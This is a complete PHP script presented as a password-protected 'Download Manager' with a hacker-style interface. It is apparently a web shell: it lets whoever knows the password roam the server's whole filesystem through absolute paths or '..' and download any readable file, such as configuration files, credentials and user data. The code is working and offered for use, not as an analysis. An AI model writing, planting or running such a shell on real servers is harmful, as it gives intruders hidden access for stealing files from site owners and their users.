<?php
session_start();

// Password protection (ganti sesuai keinginan)
$pass_hash = '$2a$12$26OCBmc4N4ePlcak3A2bqehCtjDJOF01blirEJJbpiscixCcZVcAm';

if (isset($_POST['p']) && password_verify($_POST['p'], $pass_hash)) {
    $_SESSION['auth'] = true;
}
if (!isset($_SESSION['auth'])) {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <style>
            body{background:#0a0e12;color:#0f0;font-family:monospace;padding:50px;text-align:center;}
            input{background:#1a1f2e;color:#0f0;border:1px solid #0f0;padding:12px;border-radius:8px;}
            button{background:#0f0;color:#000;border:none;padding:12px 24px;cursor:pointer;border-radius:8px;font-weight:bold;}
        </style>
    </head>
    <body>
        <h2>🔐 Login</h2>
        <form method=post>
            <input type=password name=p placeholder="Password">
            <button type=submit>Login</button>
        </form>
    </body>
    </html>';
    exit;
}

// Session directory tracker
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

// Handle directory change
if (isset($_GET['cd'])) {
    $dir = $_GET['cd'];
    $newDir = ($dir[0] == '/') ? $dir : $_SESSION['cwd'] . '/' . $dir;
    if (is_dir($newDir)) {
        $_SESSION['cwd'] = realpath($newDir);
    }
    header('Location: ?');
    exit;
}

// Handle download
if (isset($_GET['dl'])) {
    $file = $_SESSION['cwd'] . '/' . $_GET['dl'];
    if (is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Home
if (isset($_GET['home'])) {
    $_SESSION['cwd'] = getcwd();
    header('Location: ?');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<style>
body{background:#0a0e12;color:#0f0;font-family:monospace;padding:20px;}
a{color:#0f0;text-decoration:none;}
a:hover{color:#ff0;}
table{width:100%;border-collapse:collapse;}
td,th{padding:8px;text-align:left;border-bottom:1px solid #333;}
button{background:#0f0;color:#000;border:none;padding:8px 16px;cursor:pointer;border-radius:6px;font-weight:bold;}
button:hover{background:#ff0;}
.folder{color:#ff0;font-weight:bold;}
</style>
<title>📥 Download Manager</title>
</head>
<body>

<h2>📥 DOWNLOAD MANAGER</h2>
<div>📍 <?php echo $_SESSION['cwd']; ?></div>
<hr>

<div style="margin:10px 0;">
    <a href="?home=1"><button type="button">🏠 Home</button></a>
    <a href="?cd=.."><button type="button">⬆️ Parent</button></a>
</div>

<!-- FOLDERS -->
<h3>📁 FOLDERS</h3>
<table>
    <thead><tr><th>Name</th><th>Action</th></tr></thead>
    <tbody>
<?php
$items = scandir($_SESSION['cwd']);
foreach ($items as $i) {
    if ($i == '.' || $i == '..') continue;
    $path = $_SESSION['cwd'] . '/' . $i;
    if (is_dir($path)) {
        echo "<tr>
            <td class='folder'><a href='?cd=" . urlencode($i) . "'>📁 $i</a></td>
            <td>-</td>
        </tr>";
    }
}
?>
    </tbody>
</table>

<!-- FILES -->
<h3>📄 FILES</h3>
<table>
    <thead><tr><th>Name</th><th>Size</th><th>Action</th></tr></thead>
    <tbody>
<?php
foreach ($items as $i) {
    if ($i == '.' || $i == '..') continue;
    $p = $_SESSION['cwd'] . '/' . $i;
    if (!is_dir($p)) {
        $s = filesize($p);
        $size = $s < 1024 ? $s . ' B' : ($s < 1048576 ? round($s/1024,1) . ' KB' : round($s/1048576,1) . ' MB');
        echo "<tr>
            <td>📄 $i</td>
            <td>$size</td>
            <td><a href='?dl=" . urlencode($i) . "'><button type='button'>⬇️ Download</button></a></td>
        </tr>";
    }
}
?>
    </tbody>
</table>

<!-- Info footer -->
<hr>
<div style="color:#666; font-size:11px; margin-top:20px;">
    🔒 Download Only Mode - No upload, no delete, no edit
</div>

</body>
</html>
